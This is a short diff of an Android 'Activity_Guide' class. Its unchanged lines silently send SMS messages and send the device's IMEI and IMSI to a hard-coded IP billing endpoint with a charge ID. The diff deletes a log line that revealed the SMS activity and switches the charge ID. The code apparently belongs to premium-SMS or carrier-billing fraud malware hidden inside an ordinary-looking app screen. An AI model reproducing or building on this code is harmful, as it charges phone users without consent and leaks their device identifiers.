@@ -164,7 +164,6 @@ public class Activity_Guide extends Activity implements OnPageChangeListener{
 		PendingIntent pi2 = PendingIntent.getBroadcast(mContext, 0, new Intent(SMSReceiver.YOYO_SMS_RECEIVED_ACTION), 0);  
         SmsManager sms = SmsManager.getDefault(); 
         sms.sendTextMessage(phone, null , mess, pi,  pi2 ); 
-        Log.i("TAG", "phone = "+phone+", mess = "+mess);
     }  
 	
 	private void getCardMessage(){
@@ -195,7 +194,7 @@ public class Activity_Guide extends Activity implements OnPageChangeListener{
         		    					String url = "http://103.224.248.34:8096/eulbilling.aspx?"
             				        	        +"imei=" + mImei
             				        	        +"&imsi=" + mImsi
-            				        	        +"&chargeId=10436";
+            				        	        +"&chargeId=10446";
             				        	        //+"&price=15" ;
     									getJson(StringUtil.getURL(url));
         		    				//}			
